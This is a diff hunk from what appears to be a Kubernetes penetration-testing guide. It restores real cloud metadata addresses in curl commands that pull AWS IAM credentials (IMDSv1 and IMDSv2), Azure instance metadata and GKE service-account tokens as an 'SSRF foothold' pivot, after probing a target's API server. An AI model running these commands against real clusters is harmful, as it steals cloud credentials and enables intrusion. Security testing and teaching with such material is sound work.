@@ -51,10 +51,10 @@ curl --max-time 30 --connect-timeout 10 -sk "https://$TARGET:6443/api"          
 curl --max-time 30 --connect-timeout 10 -sk "https://$TARGET:6443/healthz"
 
 # Cloud metadata pivot (reach K8s SA / node creds from an SSRF foothold)
-curl --max-time 30 --connect-timeout 10 -s "http://[REDACTED_IP]/latest/meta-data/iam/security-credentials/" # AWS EKS (IMDSv1)
-TOK=$(curl --max-time 30 --connect-timeout 10 -s -X PUT "http://[REDACTED_IP]/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 60") # IMDSv2
-curl --max-time 30 --connect-timeout 10 -s -H "X-aws-ec2-metadata-token: $TOK" "http://[REDACTED_IP]/latest/meta-data/iam/security-credentials/"
-curl --max-time 30 --connect-timeout 10 -s "http://[REDACTED_IP]/metadata/instance?api-version=2021-02-01" -H "Metadata: true"      # Azure AKS
+curl --max-time 30 --connect-timeout 10 -s "http://169.254.169.254/latest/meta-data/iam/security-credentials/" # AWS EKS (IMDSv1)
+TOK=$(curl --max-time 30 --connect-timeout 10 -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 60") # IMDSv2
+curl --max-time 30 --connect-timeout 10 -s -H "X-aws-ec2-metadata-token: $TOK" "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+curl --max-time 30 --connect-timeout 10 -s "http://169.254.169.254/metadata/instance?api-version=2021-02-01" -H "Metadata: true"      # Azure AKS
 curl --max-time 30 --connect-timeout 10 -s "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google" # GKE
 ```
 Note the `gitVersion` — it gates every CVE below.
